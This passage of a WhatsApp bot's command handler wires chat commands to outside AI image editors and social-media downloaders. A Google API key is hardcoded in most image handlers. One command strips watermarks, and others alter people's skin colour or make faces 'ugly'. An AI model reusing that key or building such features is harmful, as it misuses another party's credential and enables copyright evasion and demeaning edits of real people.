if (!m.quoted) {
Hisoka.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, { quoted: m })
}
}
break

// ============Ai   
case 'faceblur':
case 'blurface': {
  if (!quoted) return reply(`Where is the photo?`)
if (!/image/.test(mime)) return reply(`Send/Reply Photo With Caption ${prefix + command}`)

let media = await Hisoka.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
  await Hisoka.sendMessage(m.chat, {image: {url: `https://api.siputzx.my.id/api/iloveimg/blurface?image=${response}` }, caption: foother }, {quoted: m})
}
break
case "imagebing": case "bingimage":
case "imgbing": case "bingimg": {
    if (!args.length) return m.reply("Enter image prompt!\nExample: imgbing red sports car");
    let query = encodeURIComponent(args.join(" "));
    let url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;
    try {
        await Hisoka.sendMessage(from, { react: { text: "⏳", key: m.key } });
        let response = await fetch(url);
        let data = await response.json();
        if (data.status !== 200 || !data.data.result.length) {
            return m.reply("Image not found!");
        }
        for (let img of data.data.result) {
            await Hisoka.sendMessage(from, { image: { url: img }, caption: "Sorry if not suitable 😌" }, { quoted: m });
        }
        await Hisoka.sendMessage(from, { react: { text: "✅", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("An error occurred while fetching the image.");
    }
}

    break
case 'toanime':
case 'toreal': {
  try {
    if (!/image/.test(mime)) {
      return m.reply(`Send/Quote image with caption ${command}`)
    }
    await Hisoka.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
    
    const style = command === 'toanime' ? 'AnimageModel' : 'RealisticModel'
    const media = await Hisoka.downloadAndSaveMediaMessage(quoted)
    const imageUrl = await CatBox(media)

    const apiUrl = `https://fastrestapis.fasturl.cloud/imgedit/aiimage?prompt=Anime&reffImage=${encodeURIComponent(imageUrl)}&style=${style}&width=1024&height=1024&creativity=0.5`
    
    await Hisoka.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m })
  } catch (err) {
    console.error('An error occurred:', err)
    m.reply('An error occurred')
  } finally {
    if (media) {
      fs.promises.unlink(media).catch(() => {})
    }
  }
}

break
case 'ocr': {
  try {
    await Hisoka.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key
      }
    })
    const axios = require('axios')
    const FormData = require('form-data')
    const Uguu = async (buffer, filename) => {
      const form = new FormData()
      form.append('files[]', buffer, { filename })
      const { data } = await axios.post('https://uguu.se/upload.php', form, {
        headers: form.getHeaders()
      })
      if (data.files && data.files[0]) {
        return data.files[0].url
      } else {
        throw new Error('upload to uguu.se failed, please try again later')
      }
    }
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''
    if (!mime.startsWith('image/')) throw 'please send or reply with an image'
    let media = await q.download()
    let ext = mime.split('/')[1] || 'jpg'
    let filename = `ocr.${ext}`
    let imageUrl = await Uguu(media, filename)
    let { data } = await axios.get(`https://api.alyachan.dev/api/ocr?image=${imageUrl}&apikey=DinzIDgembul`)
    if (!data?.status || !data.result?.text) throw 'OCR failed or text not found'
    let hasil = data.result.text.replace(/\r/g, '').trim()
    await Hisoka.sendMessage(m.chat, {
      react: {
        text: '✅',
        key: m.key
      }
    })
    m.reply(hasil)
  } catch (err) {
    m.reply(typeof err === 'string' ? err : err.message || 'An error occurred while processing the image')
  }
}
break
case 'remove-wm': {
  let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
 
  let defaultPrompt = `Remove the watermark present in the image. Pay close attention as the watermark may appear at the top, bottom, center, or hidden with small size, transparent, or blurred. Remove the watermark completely without reducing the quality of the original image and without changing other visual elements. Ensure the image remains intact, clean, and looks natural as if it never had a watermark.`
  
  if (!mime) return m.reply(`Send/reply image with caption *${usedPrefix + command}*`)
  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} not supported! Only jpeg/jpg/png`)
  
  let promptText = text || defaultPrompt
  
  reply("Delete Watermark...")
 
  try {
    let imgData = await q.download()
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8")
 
    const base64Image = imgData.toString("base64")
 
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ]
 
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    })
 
    const response = await model.generateContent(contents)
 
    let resultImage
    let resultText = ""
 
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text
      } else if (part.inlineData) {
        const imageData = part.inlineData.data
        resultImage = Buffer.from(imageData, "base64")
      }
    }
 
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`)
      fs.writeFileSync(tempPath, resultImage)
 
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Delete Watermark*`
      }, { quoted: m })
 
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath)
        } catch {}
      }, 30000)
    } else {
      m.reply("Yah Errror")
    }
  } catch (error) {
    console.error(error)
    m.reply(`${error.message}`)
  }
}
break
case 'gemini':
case 'luminai':
case 'gpt':
case 'openai':
case 'ai': {
      try {
        if (!text) return m.reply(`Example: ${command} hai`);
        await Hisoka.sendMessage(m.chat, {react: {text: '💬', key: m.key}})
        let prompt = `Your name is ${namaBot} and use English as your primary language.`
        const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${prompt}&content=${text}`)
        const gpt = apiUrl.data
        m.reply(`${gpt}`)
      } catch (err) {
        console.error(err)
        m.reply('An error occurred')
      }
    }

break
case "edit-ai": {
if (!text) return m.reply(`Promt nya mana?`);
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `${text}`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "hitamkan": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `change character skin color to black`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "putihkan": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `change character skin color to white`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "night": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `change to night time`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "pretty": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `edit character face to Korean face`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "ugly": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `edit character face to ugly`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "sad": case "sedih": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `change facial expression to sad`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "smile": case "senyum": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `change facial expression to happy`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
case "botakin": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `remove hair from the head`;
  
  if (!mime) return reply(`Send/reply image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  reply("Please wait...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Hisoka.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if not appropriate*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break
//============ Download
case 'pindl':
case 'pinterestdl': {
  if (!text) return m.reply('❌ Enter URL Pinterest!\nExample: .pinterestdl https://pin.it/2NCffxXoN');

  try {
    await Hisoka.sendMessage(m.chat, {
      react: { text: '⏰', key: m.key }
    });

    const res = await fetch(`https://api.nekorinn.my.id/downloader/pinterest?url=${encodeURIComponent(text)}`);
    const data = await res.json();

    if (!data.status || !data.result || !data.result.medias?.length) {
      return m.reply('❌ No media found at that link.');
    }

    const media = data.result.medias.find(m => m.extension === 'mp4') ||
                  data.result.medias.find(m => m.extension === 'jpg');

    if (!media) return m.reply('❌ No media found to send.');

    const caption = `📌 *Pinterest Downloader*\n\n🎞️ *Judul:* ${data.result.title}\n💾 *Ukuran:* ${media.formattedSize || '-'}\n📎 *Sumber:* ${text}`;
    const type = media.extension === 'mp4' ? 'video' : 'image';

    await Hisoka.sendMessage(m.chat, {
      [type]: { url: media.url },
      caption
    }, { quoted: m });

  } catch (err) {
    console.error('PinterestDL Error:', err);
    m.reply('❌ An error occurred while fetching Pinterest media.');
  }
}
break
//
async function snck(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/snackvideo?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Failed to access IGDL API:", error);
    throw error;
  }
}
case "snackvideo":
      case "sv":
        {
          if (!text) {
            return reply(`where is the link? example: ${prefix + command} https://url/reel/xxx/?igsh=xxx`);
            HisokaReact()
          }
          let memek = await snck(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await Hisoka.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "successfully downloaded image from URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await Hisoka.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: m
                  });
                } else {
                  await Hisoka.sendMessage(m.chat, {
                    text: `media type not supported: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await Hisoka.sendMessage(m.chat, {
              text: "Media not found or an error occurred while retrieving media."
            }, {
              quoted: m
            });
          }
        }
        break;
//
async function ccdl(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Failed to access IGDL API:", error);
    throw error;
  }
}
case "capcut":
      case "cc":
        {
          if (!text) {
            return reply(`where is the link? example: ${prefix + command} https://url/reel/xxx/?igsh=xxx`);
            HisokaReact()
          }
          let memek = await ccdl(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await Hisoka.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "successfully downloaded image from URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await Hisoka.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: m
                  });
                } else {
                  await Hisoka.sendMessage(m.chat, {
                    text: `media type not supported: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await Hisoka.sendMessage(m.chat, {
              text: "Media not found or an error occurred while retrieving media."
            }, {
              quoted: m
            });
          }
        }
        break;
//
async function fbdll(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/facebook?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Failed to access IGDL API:", error);
    throw error;
  }
}
case "facebook":
      case "fb":
        {
          if (!text) {
            return reply(`where is the link? example: ${prefix + command} https://url/reel/xxx/?igsh=xxx`);
            HisokaReact()
          }
          let memek = await fbdll(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await Hisoka.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "successfully downloaded image from URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await Hisoka.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: m
                  });
                } else {
                  await Hisoka.sendMessage(m.chat, {
                    text: `media type not supported: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await Hisoka.sendMessage(m.chat, {
              text: "Media not found or an error occurred while retrieving media."
            }, {
              quoted: m
            });
          }
        }
        break;
//
async function igdl(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/igdl?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Failed to access IGDL API:", error);
    throw error;
  }
}
case "instagram":
      case "ig":
        {
          if (!text) {
            return reply(`where is the instagram link? example: ${prefix + command} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh`);
            HisokaReact()
          }
          let memek = await igdl(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await Hisoka.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "successfully downloaded image from URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await Hisoka.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: "乂 *I N S T A G R A M  D O W N L O A D* 乂"
                  }, {
                    quoted: m
                  });
                } else {
                  await Hisoka.sendMessage(m.chat, {
                    text: `media type not supported: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await Hisoka.sendMessage(m.chat, {
              text: "Media not found or an error occurred while retrieving media."
            }, {
              quoted: m
            });
          }
        }
        break;
case "tiktok":
      case "tt":
        {
          let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`";
          if (!text.startsWith("https://")) {
            return reply(example("url"));
          }
          await tiktokDl(q).then(async result => {
            await Hisoka.sendMessage(m.chat, {
              react: {
                text: "🕖",
                key: m.key
              }
            });
            if (!result.status) {
              return reply("Error!");
            }
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: Hisoka.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Slide Photo *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Photo Link\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TIKTOK - DOWNLOADER*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: m
              });
              await Hisoka.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await Hisoka.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                caption: momok,
                footer: `\n${namaBot}`,
                buttons: [{
                  buttonId: `.toaudio`,
                  buttonText: {
                    displayText: "Get the Music"
                  }
                }],
                viewOnce: true
              }, {
                quoted: m
              });
            }
          }).catch(e => console.log(e));
          await Hisoka.sendMessage(m.chat, {
            react: {
              text: "✅",
              key: m.key
            }
          });
        }
        break;
case "ytmp4": {
if (!text) return reply(`*Wrong Usage!*\nexample: .${command} (link)`)
